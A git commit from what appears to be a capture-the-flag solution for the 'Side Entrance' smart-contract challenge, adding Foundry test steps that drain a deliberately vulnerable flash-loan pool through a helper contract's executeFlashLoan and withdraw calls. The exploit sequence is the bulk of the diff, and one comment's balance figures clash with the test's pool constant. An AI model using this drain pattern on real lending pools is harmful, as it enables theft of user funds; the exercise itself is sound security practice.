f15d9e03c66c408834912bccc2983b2b38d0ca73
roy_chen <roy_chen@gss.com.tw>
2023-06-24 00:52:50 +0800

    complete `Challenge #4 - Side Entrance`

--- test/Levels/side-entrance/SideEntrance.t.sol
+++ test/Levels/side-entrance/SideEntrance.t.sol
@@ -6,6 +6,8 @@ import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
+import {EtherReceiver} from "./EtherReceiver.sol";
+
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
 
@@ -36,7 +38,18 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
+        // attacke: 100e, pool: 100e
+        vm.startPrank(attacker);
+        EtherReceiver etherReceiver = new EtherReceiver();
+        // 1. 把 ether 轉給 EtherReceiver
+        (bool success,) = address(etherReceiver).call{value: address(attacker).balance}("");
+        require(success, "Transfer to EtherReceiver failed.");
+        // 2. 呼叫 EtherReceiver 的 executeFlashLoan
+        etherReceiver.executeFlashLoan(address(sideEntranceLenderPool));
+        // 3. 呼叫 EtherReceiver 的 withdraw
+        etherReceiver.withdraw();
 
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
